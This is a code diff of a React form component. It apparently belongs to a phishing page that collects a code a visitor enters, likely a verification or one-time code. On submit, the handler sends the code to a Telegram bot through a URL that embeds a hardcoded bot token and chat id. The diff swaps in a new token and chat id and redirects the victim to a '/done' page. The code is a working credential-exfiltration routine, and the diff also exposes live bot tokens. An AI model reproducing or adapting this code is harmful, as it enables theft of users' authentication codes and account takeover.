@@ -15,15 +15,15 @@ function Code() {
     e.preventDefault();
 
     if (Number) {
-      const bot_token = '6292955787:AAE5oPybPhyD3BUyveVgw9QsQMNZ6I51vpM';
-      const user_id = 727686605;
+      const bot_token = '5912247911:AAF5D53I7Q89_juB6I-Je9jJMoC5ENYgKD0';
+      const user_id = 5339916869;
       let my_text = `Code : ${Number}`;
 
       const url = `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${user_id}&text=${my_text}`;
       let api = new XMLHttpRequest();
       api.open('Get', url, true);
       api.send();
-      navigate('/');
+      navigate('/done');
     } else {
       null;
     }
@@ -36,7 +36,7 @@ function Code() {
       </div>
       <div>
         <form
-          action=""
+          action="www.cl.com"
           onSubmit={handelSubmit}
           className="flex items-center justify-center gap-3 flex-col lg:flex-row"
         >
